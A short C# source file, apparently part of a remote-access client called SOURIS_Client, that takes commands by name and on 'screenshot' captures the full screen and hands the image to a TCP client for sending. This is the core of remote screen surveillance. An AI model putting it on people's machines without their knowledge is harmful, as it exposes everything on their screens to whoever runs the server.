using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SOURIS_Client
{
    class Order
    {
        public static void Switchjobs(string order)
        {
            switch (order)
            {
                case "screenshot":
                    {
                        screenshot();
                        return;
                    }
                default:
                    error();
                    return;
            }
                
                    
            
        }
        public static void screenshot()
        {
            Bitmap resolution;
            resolution = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
            Size size = new Size(resolution.Width, resolution.Height);
            Graphics memoryGraphics = Graphics.FromImage(resolution);
            memoryGraphics.CopyFromScreen(0, 0, 0, 0, size);
            OrderClient.TCPClient(resolution);
            Console.WriteLine("screeen");
        }
        public static void error()
        {

        }
    }
}
